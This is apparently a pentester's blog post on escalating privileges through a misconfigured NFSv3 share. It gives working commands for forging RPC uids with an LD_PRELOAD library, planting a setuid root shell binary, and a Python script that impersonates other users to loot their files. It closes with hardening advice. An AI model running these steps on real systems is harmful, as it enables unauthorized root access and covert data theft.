A tale of a lesser known NFS privesc
====================================

[There](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) [are](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/) [countless](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/) [online](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/) [examples](https://resources.infosecinstitute.com/exploiting-nfs-share/) [of](https://touhidshaikh.com/blog/?p=788) [privilege](https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html) [escalation](https://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html) abusing bad NFS configuration.

However they all rely on the same prerequisite: that you are able to mount the share from somewhere else.


The NFS options
---------------

Server export options (found in the `/etc/exports` file):

* `secure`/`insecure`: in secure mode, forces the client to communicate using a port below 1024, hence proving they are root
* `root_squash`/`no_root_squash`: `root_squash` is the **secure default**. It replaces the root user with nfsnobody. This prevents setuid attacks, such as those presented below. The opposite option `no_root_squash` has the share behave like a traditional filesystem
* filtering: only let identified IP addresses mount the shares

Client mount options (found in the `/etc/fstab` file):

* `noexec`: forbids execution from the mountpoint
* `nosuid`: forbids setuid permission on binaries on the mountpoint


The classic remote attack
-------------------------

To briefly sum up what the attacks presented in the previous links do:

* mount the share from another machine where you're root
* place a setuid binary there
* on the victim machine, run the binary and get root

This attack requires two things:

* that the server is running `no_root_squash`
* that there are no network/application restrictions that prevents the attacker from mounting the share on his own computer.

The latter can be verified by listing the shares available on the remote server:
```
[root@pentest] showmount -e nfs-server
Export list for nfs-server:
/nfs_root   (everyone)
```


The local attack
----------------

Now, let's assume that the share server still runs `no_root_squash` but there is something preventing us from mounting the share on our pentest machine. This would happen if the `/etc/exports` has an explicit list of IP addresses allowed to mount the share.

Listing the shares now shows that only the machine we're trying to privesc on is allowed to mount it:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```

This means that we're stuck exploiting the mounted share on the machine locally from an unprivileged user. But it just so happens that there is another, lesser known local exploit.

This exploit relies on a problem in the NFSv3 specification that mandates that it's up to the client to advertise its uid/gid when accessing the share. Thus it's possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!

Here's a [library that lets you do just that](https://github.com/sahlberg/libnfs).

### Compiling the example
Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscall. Due to the absence of cmake on the system, I also needed to link against the precompiled library which can be [found here](https://sites.google.com/site/libnfstarballs/li).

```bash
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L../libnfs-1.11.0/lib/.libs/
```

### Exploiting using the library
Let's use the simplest of exploits:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

Place our exploit on the share and make it suid root by faking our uid in the RPC calls:
```bash
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

All that's left is to launch it:
```bash
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```

There we are, local root privilege escalation!

Kudos to [lnv42](https://github.com/lnv42/) for showing me this cool trick.


Bonus NFShell
-------------
Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn't read despite being root because of the uid mismatch. I didn't want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

You can then run most commands as you normally would by prefixing them with the script:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```


Takeaways
---------

Don't use NFSv3.

If you **HAVE** to use NFSv3:

* Don't use `no_root_squash` serverside
* Use `noexec` and `nosuid` clientside
